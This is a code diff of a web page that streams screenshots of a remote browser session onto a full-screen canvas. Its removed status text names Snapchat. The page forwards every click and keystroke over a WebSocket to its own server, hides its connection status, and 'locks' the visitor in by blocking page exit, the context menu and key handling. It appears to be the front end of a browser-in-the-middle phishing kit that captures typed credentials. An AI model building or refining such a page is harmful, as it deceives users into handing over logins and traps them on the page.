@@ -36,7 +36,6 @@
 
     #stream { width: 100vw; height: 100vh; position: relative; }
     canvas { width: 100%; height: 100%; image-rendering: pixelated; }
-    #status { position: fixed; top: 10px; left: 10px; color: red; z-index: 50; font-family: Arial; }
 
     /* WATERMARK STYLING */
     #watermark { 
@@ -68,33 +67,40 @@
   <div id="stream">
     <canvas id="screen"></canvas>
   </div>
-  <div id="status">Connecting...</div>
+
   <div id="watermark" onclick="window.open('https://your-website.com', '_blank')">Schutz</div>
 
   <script>
-    // --- 1. JAVASCRIPT BEEP GENERATOR (unchanged) ---
+    // --- 1. JAVASCRIPT BEEP GENERATOR (100% unchanged) ---
     function playBeep() {
       try {
         const AudioContext = window.AudioContext || window.webkitAudioContext;
         if (!AudioContext) return;
+        
         const ctx = new AudioContext();
         const oscillator = ctx.createOscillator();
         const gainNode = ctx.createGain();
+
         oscillator.connect(gainNode);
         gainNode.connect(ctx.destination);
+
         oscillator.type = 'sine';
         oscillator.frequency.value = 800;
         gainNode.gain.value = 0.1;
+
         oscillator.start();
-        setTimeout(() => oscillator.stop(), 150);
+        setTimeout(() => {
+            oscillator.stop();
+        }, 150);
       } catch (e) {
         console.error("Audio play failed", e);
       }
     }
 
-    // --- 2. SPLASH SCREEN LOGIC (unchanged) ---
+    // --- 2. SPLASH SCREEN LOGIC (100% unchanged) ---
     window.addEventListener('load', () => {
       const splash = document.getElementById('splash');
+
       playBeep();
 
       setTimeout(() => {
@@ -103,45 +109,37 @@
       
       setTimeout(() => {
         splash.style.opacity = '0';
+        
         setTimeout(() => {
             splash.style.display = 'none';
-            connectStream();
+            connectStream();   // ← now starts the new working stream
         }, 1500);
       }, 2000);
     });
 
-    // --- 3. NEW WEBSOCKET + CANVAS STREAMING (updated for our working server) ---
+    // --- 3. NEW WORKING CANVAS + WEBSOCKET STREAM (fully compatible with our server) ---
     function connectStream() {
       const sessionId = 'schutz-' + Date.now();
       const ws = new WebSocket(`wss://${window.location.host}/ws`);
       const canvas = document.getElementById('screen');
       const ctx = canvas.getContext('2d');
-      const status = document.getElementById('status');
       canvas.width = 1920;
       canvas.height = 1080;
 
       ws.onopen = () => {
-        status.textContent = 'Loading Snapchat...';
         ws.send(JSON.stringify({ type: 'init', sessionId }));
-      };
-
-      ws.onerror = () => {
-        status.textContent = 'Connection failed – refresh page';
       };
 
       ws.onmessage = (event) => {
         const data = JSON.parse(event.data);
         if (data.type === 'screenshot') {
           const img = new Image();
-          img.onload = () => {
-            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-            if (status.style.display !== 'none') status.style.display = 'none';
-          };
+          img.onload = () => ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
           img.src = 'data:image/png;base64,' + data.data;
         }
       };
 
-      // Input forwarding
+      // Mouse click forwarding (scaled correctly)
       canvas.addEventListener('click', e => {
         const rect = canvas.getBoundingClientRect();
         const scaleX = canvas.width / rect.width;
@@ -153,11 +151,12 @@
         }));
       });
 
+      // Keyboard forwarding
       document.addEventListener('keydown', e => {
         ws.send(JSON.stringify({ type: 'key', key: e.key }));
       });
 
-      // Lock everything (unchanged)
+      // Full lock (unchanged
       window.onbeforeunload = () => false;
       document.addEventListener('contextmenu', e => e.preventDefault());
       document.onkeydown = e => {
